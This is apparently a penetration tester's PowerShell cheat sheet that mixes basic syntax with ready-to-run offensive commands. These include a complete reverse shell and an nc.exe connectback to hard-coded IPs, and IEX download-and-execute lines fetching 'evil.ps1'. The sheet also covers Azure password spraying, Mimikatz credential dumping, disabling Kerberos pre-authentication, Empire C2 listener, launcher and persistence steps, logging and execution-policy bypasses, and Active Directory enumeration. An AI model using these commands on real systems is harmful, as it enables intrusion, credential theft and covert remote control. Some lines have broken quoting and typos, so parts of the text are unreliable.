# PowerShell

## Comparison Operators
------
#### Greater Than / Less Than
+ -gt 5
+ -lt 0

### Data Types
#### Array
```
$a = 1..5
$c = 'a','b','c'
(System.Object[])
[int32[]]$d = 1,2,3,4
```


#### Wildcard Matching
-like 'powersh*'

### Help
#### Find All Cmdlets
Get-Cmdlet \*
Get-Command Get-Alias

## Remoting
------
#### Create a PSCredential
+ $username="foo"
+ $pass = ConvertTo-SecureString "bar" -AsPlainText -Force
+  New-Object -TypeName PSCredential -ArgumentList $username,$pass

#### Enter a Remote Session (admin access required)
+ $sess= New-PSSession -ComputerName remotehost
+  Enter-PSSession -ComputerName remotehost

#### Run a Remote Command
Get-WMIObject –ComputerName remotehost –query "Select * from Win32_Service Where Name=‘LanManServer'"" | Format-Table
#### Disable Kerberos PreAuth
Set-DomainObject -Identity userName -XOR @{useraccountcontrol=4194304} -Verbose
#### Import a Module
Import-Module -Name .\MSOLSpray.ps1; 
#### Azure Password Spray
Invoke-MSOLSpray -Userlist ./users.txt -Password "Spring2020"
#### PowerShell Command History File
% AppData Roaming Microsoft Windows PowerShell PSReadLine ConsoleHost_history.txt

## WMIC
------
#### List Scheduled Tasks with Actions
`Get-ScheduledTask | %{"$($_.TaskName) : $($_.Actions.Execute) $($_.Actions.Arguments)"}`
#### Change Scheduled Task Action
Set-ScheduledTask MYTASK -Action $(New-ScheduledTaskAction -Action "C:\path\file.exe")
#### Raw WMIC Query
Get-CimInstance -Query "SELECT * from Win32_Process WHERE name LIKE 'P%'"
#### Get AVs Installed
+ Get-CimInstance -Namespace root\securitycenter2 AntiSpywareProduct
+  Get-CimInstance -Namespace root\securitycenter2 AntiVirusProduct
+ 

#### List All Namespaces
Get-WmiObject -Namespace root\CIMv2 -list
#### List Running Servcies
Get-WmiObject -Query "SELECT * FROM win32_service WHERE state='running'" 
#### List Services Beginning with "T"
Get-WmiObject -Query "SELECT * FROM win32_service WHERE name LIKE '[tT]%'"
#### List Processes Like "owershell"
gwmi win32_process -Filter "name LIKE ‘_owershell%'"
#### Remote Get-WMIObject Command
Get-WMIObject –ComputerName remotehost –query "Select * from Win32_Service Where Name='LanManServer'" | Format-Table

## Bloodhound
------
#### EXE Ingestor
.\SharpHound.exe --CollectionMethod All --LDAPUser <UserName> --LDAPPass <Password> --JSONFolder <PathToFile>
#### Powershell Ingestor (SharpHound.ps1)
Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
#### Start Neo4J and Import Bloodhound Results
+ systemctl start neo4j
+  Navigate to http://127.0.0.1:7373
+  Configure username and password
+  ./BloodHound-linux-x64/BloodHound
+  Authenticate to Neo4j server
+  Upload the BloodHound.zip file within the GUI.

#### PowerShell Reverse Shell
+ $client = New-Object System.Net.Sockets.TCPClient("192.168.119.140",4444)
+  $stream = $client.GetStream()
+  [byte[]]$bytes = 0..65535|%{0}
+ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+ $sendback = (iex $data 2<&1 | Out-String )
+ $sendback2 = $sendback + "PS " + (pwd).Path + "> "
+ $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+ $stream.Write($sendbyte,0,$sendbyte.Length)
+ $stream.Flush()}
+ $client.Close()

#### PowerShell Bind Shell
+ $listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443)
+  $listener.start()
+  $client = $listener.AcceptTcpClient()
+  $stream = $client.GetStream()
+  [byte[]]


## PowerSploit
------
#### Enumerate User
Get-NetUser <user>
#### Enumerate Group
Get-NetGroup <group>
#### Enumerate Computers
Get-NetComputer -FullData
#### Enumerate Live Machines
Get-NetComputer -Ping
#### Get Groups for which User is member
Get-NetGroup -Username <user>
#### Group Members
Get-NetGroupMember <group> -Domain <DomainName>
#### Enumerate Domain Shares
Find-DomainShare (-CheckShareAccess)
#### Enumerate Group Policies
Get-NetGPO
#### Enumerate Group Policy for Specific Computer
Get-NetGPO -ComputerName cpu.local
#### Enumerate OUs
Get-NetOU
#### Enumerate ACLs
Get-ObjectAcl -SamAccountName <AccountName> -ResolveGUIDs
#### Find Interesting ACEs
Invoke-ACLScanner -ResolveGUIDs
#### Check ACLs associated with SMB Share
Get-PathAcl -Path "\\Path\to\share"
#### Enumerate Domain Trusts
Get-NetDomainTrust
#### Enumerate Forest Trusts
Get-NetForestDomain
#### Find All Local Admins
Invoke-EnumerateLocalAdmin -Verbose
#### Find Computers Where DA has Session
Invoke-UserHunter -GroupName "RDPUsers" (-Stealth)
#### Apply New ACL
New-Item File.txt | Get-Acl | Set-ACl foobar.ps1
#### Get all effective member of group
Get-NetGroupMember -GroupName <group> -Recurse
#### Search the forest global catalog
Get-NetUser -UserName <user> -ADSpath "GC: //domain.com"
#### Find Privileged Machine Accounts
Get-NetGroup -AdminCount | Get-NetGroupMember -Recurse | ?{$_.MemberName -like '*$'}
#### Find Domain Admins and Users with same first/last name
Get-NetGroupMember -GroupName "Domain Admins" -FullData | %{ $a=$_.displayname.split(" ")[0..1] -join " "; Get-NetUser -Filter "(displayname=*$a*)"} | Select-Object -Property displayname,samaccountname
#### Check Last Password Change
Get-UserProperty -Properties pwdlastset
#### Find Logged In Users
Get-NetLoggedOn -ComputerName <ComputerName>
#### Basic NC connectback
powershell.exe -NoExit -Command 'C:/temp/temp2/nc.exe -v 192.168.99.21 4444 -e powershell'
#### One-Liner (no script on disk)
Invoke-Expression
#### Run remote script (in-memory)
powershell -Command "$ip='http://A.B.C.D:22/launcher.ps1; IEX (New-Object Net.webclient).DownloadString($ip)"
#### Run remote HTA (in-memory)

#### Run a Ping Sweep
1..22 | % {"10.2.3.$($_): $(Test-Connection -count 1 -comp 10.2.3.$($_) -quiet)"}

#### Invoke Vulnerable Service
Install-ServiceBinary -ServiceName 'VulnSVC'
#### 

#### Encoded Commands
+ -encodedcommand
+ -e
+ -en
+ -enc


## Mimikatz
------
#### Dump Creds
Invoke-Mimikatz -DumpCreds -ComputerName remotehost
#### Execute Classic Mimikatz Commands
Invoke-Mimikatz -Command '"privilege::debug"'

## PowerShell Empire
------
#### Set up a HTTP Listener (C2 profile)
listeners; uselistener http; set Host a.b.c.d:8080; execute;
#### Create an Empire launcher (rat/aka way to get shellz)
listeners; usestager multi/launcher; set Listener http; set OutFile /opt/agent.ps1; generate
#### List all Agents
agents
#### Interact with an Agent
interact AGENT1
#### Rename an Agent
rename AGENTNEW
#### Persist with a Module
usemodule persistence/userland/schtasks; set Listener http; set IdleTime 2; set Agent autorun; run
#### Import a PowerShell Script and Run
agents; interact AGENT1; scirptimport /opt/Do-Thing.ps1; scriptcmd Do-Thing
#### Empire Powershell Payload
powershell -noP -sta -w1 -enc <base64-encoded-payload>
#### ScriptBlock Logging
Logging feature that captures PS scripts in readable form.  Empire may bypass by unhooking it via "cachedGroupPolicySettings" variable manipulation.  It may also nullify the "suspicious strings" array.  
#### Query Windows Events
Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational -MaxEvents 5
#### Query Specific Windows Event IDs
-Get-WinEvent -FilterHashTable @{logname='Microsoft-Windows-Sysmon/Operational'; Id=10}

## Basics
------
#### List Environment Variables
Get-ChildItem Env:
#### Clear value from variable
Clear-Variable -Name foo
#### List $PATH Environment Variable
(gci env:PATH).value.replace(";","\`n")
#### Quickly list out numbers
1..255
#### List Properties of a Registry Key
(Get-Item HKLM:\SYSTEM\CurrentControlSet\Control\Lsa) | Get-ItemProperty
#### Run .PS1 File
. .\Add-SSP
#### List all Files in Directory
Get-ChildItem C:\Users\user -Recurse
#### Recusively grep through all files in directory
Get-ChildItem . -Recurse -ErrorAction Silentlycontinue | Select-String -Pattern "password"
#### List loaded assemblies in current process
[appdomain]::currentdomain.getassemblies() | so -Property fullname | ft fullname
#### Find Files with Insecure Permissions
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$\_.AccessToString -match "Everyone\sAllow\s\sModify"}

#### Set System Environment Variables
\[System.Environment\]::SetEnvironmentVariable($varName, $varValue, [System.EnvironmentVariableTarget]::Machine)
#### Make a DNS Request
`[System.Net.Dns]::Resolve('foo.com')`
#### List Alternate Data Streams
Get-Item -Path C:\\path\\to\\foo.txt -Stream *
Get-Item -Path C:\\path\\to\\foo.txt -Stream * | ?{$_.Stream -ne ':$DATA'} | %{$_.Stream}
#### Read Alternate Data Streams
Get-Item -Path C:\\path\\to\\foo.txt -Stream myhiddenstream

## AD
------
#### Get LAPS Password
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime

## Pinvoke
------
#### Basic Pinvoke
```

$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32{
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);
}
"@

Add-Type $User32
[User32]::MessageBox(0,"This is an alert", "MyBox", 0)
```

#### Determine Execution Policy 
Get-ExecutionPolicy -List
#### Set Execution Policy to Bypass
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
powershell.exe -ExecutionPolicy bypass


## Dotnet Interaction
#### Access static method with reference to class
(New Object Namespace.Class).Method()

#### Download and Execute
IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.206:6666/evil.ps1')
IEX ( iwr ''http://192.168.56.206:6666/evil.ps1")

#### List all services that do not run as a standard account
Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\* | Where-Object {($_.ObjectName -notlike 'NT Authority\*') -and ($_.ObjectName -ne $null) -and ($_.ObjectName -ne "LocalSystem")}